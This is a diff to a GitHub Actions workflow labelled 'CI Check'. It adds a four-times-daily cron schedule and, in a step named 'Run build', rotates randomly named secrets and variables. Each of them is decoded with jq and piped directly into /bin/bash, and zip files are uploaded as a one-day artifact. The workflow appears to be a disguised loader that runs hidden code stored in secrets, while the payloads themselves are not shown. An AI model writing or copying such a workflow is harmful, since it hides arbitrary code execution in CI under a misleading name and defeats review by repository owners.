@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '27 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,21 +20,17 @@ jobs:
           fetch-depth: 1
       - name: Run build
         env:
-          hw1: ${{ secrets.hw1 }}
+          h86566: ${{ secrets.h86566 }}
         run: |
-          printf '%s' "$hw1" | jq -r .fvy572 | /bin/bash
-          echo $bsyy1 | jq -r .yz4 | /bin/bash
-          echo $jzy2 | jq -r .krzk07692 | /bin/bash
-          printf '%s' "$r8" | jq -r .kmb95 | /bin/bash
-          printf '%s' "$v777" | jq -r .mv5 | /bin/bash
-          printf '%s' "$q817" | jq -r .bx6 | /bin/bash
-          printf '%s' "$wmzm90890" | jq -r .ndrec392 | /bin/bash
-          printf '%s' "$oh9" | jq -r .eka67473 | /bin/bash
+          printf '%s' "$h86566" | jq -r .tdp3375 | /bin/bash
+          printf '%s' "$j2" | jq -r .lik74 | /bin/bash
+          echo $mdg3 | jq -r .fq50328 | /bin/bash
+          echo $aire5 | jq -r .v70188 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 1uUoAGJU
+          name: dhZkdTW8
           path: "*.zip"
           retention-days: 1
